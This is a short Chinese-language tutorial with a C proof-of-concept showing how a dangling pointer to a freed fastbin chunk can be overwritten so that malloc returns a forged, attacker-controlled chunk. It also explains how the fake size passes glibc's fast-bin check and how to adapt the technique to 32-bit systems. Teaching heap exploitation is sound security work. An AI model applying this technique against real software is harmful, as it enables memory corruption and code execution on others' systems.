# Forging chunks(伪造chunks)

释放一个chunk后，会将其插入到 bin list中。但是其指针仍然在程序中处于可用状态，如果攻击者控制了这个指针，就可以修改bin中的链表结构并插入他自己伪造的chunk。

```c++
struct forged_chunk {
  size_t prev_size;
  size_t size;
  struct forged_chunk *fd;
  struct forged_chunk *bck;
  char buf[10];               // padding
};

// First grab a fast chunk
a = malloc(10);
// Create a forged chunk
struct forged_chunk chunk;    // At address 0x7ffc6de96690
chunk.size = 0x20;            // This size should fall in the same fastbin
data = (char *)&chunk.fd;     // Data starts here for an allocated chunk
strcpy(data, "attacker's data");
// Put the fast chunk back into fastbin
free(a);
// Modify 'fd' pointer of 'a' to point to our forged chunk
*((unsigned long long *)a) = (unsigned long long)&chunk;
// Remove 'a' from HEAD of fastbin
// Our forged chunk will now be at the HEAD of fastbin
malloc(10);                   // Will return 0x219c010

victim = malloc(10);          // Points to 0x7ffc6de966a0
printf("%s\n", victim);       // Prints "attacker's data" !!
```

伪造的chunk的大小参数设置为0x20，以便它通过安全检查“malloc(): memory corruption (fast)”。此安全检查将检查chunk的大小是否落在特定fast bin的范围内。

> 已分配块的数据从fd指针开始

fast bins中的情况：

1. free(a): `head -> a -> tail`
2. `*((unsigned long long *)a) = (unsigned long long)&chunk;` : `head -> a -> 伪造块 -> undefined(伪造的块的fd实际上会有攻击者的数据)`
3. malloc(10): `head -> 伪造的块 -> undefined`
4. victim=malloc(10): `head -> undefined`

注意：

- 在同一个bin列表中对fast chunk的另一个’malloc’请求将导致分段错误。
- 即使我们请求10个字节并将伪造块的大小设置为32（0x20）字节，两者都落在相同的fastbin的32字节chunk的范围内。
- 以上代码专为64位计算机而设计。为了在32位机器上运行它，替换unsigned long long用unsigned int作为指针现在4个字节，而不是8个字节。此外，不是使用32字节作为伪造chunk的大小，而是大约17字节的一小部分
